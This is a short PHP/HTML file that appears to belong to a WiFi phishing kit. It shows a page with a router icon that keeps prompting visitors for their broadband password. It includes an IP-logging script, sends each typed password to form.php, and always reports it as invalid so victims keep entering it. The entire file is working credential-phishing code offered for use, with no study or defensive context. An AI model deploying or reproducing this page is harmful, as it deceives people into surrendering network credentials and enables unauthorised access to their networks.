<?php
include 'ip.php';
?>
<html>
  <head>
  <link rel="icon" href="https://e7.pngegg.com/pngimages/98/10/png-clipart-white-tp-link-wireless-modem-router-wireless-router-tp-link-bandwidth-wifi-computer-network-electronics.png">
    <script>
      while(true){
        var inp = prompt("🛡WIFI🛡\nTo Continue Enter your Broadband(Wifi) Password.");
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'form.php?pass='+inp, false);
        xhr.send();
      alert("⛔️Invalid Password⛔️");
      alert("⚠️try again!⚠️");
      }
    </script>
  <head>
  <body>

  </body>
</html>
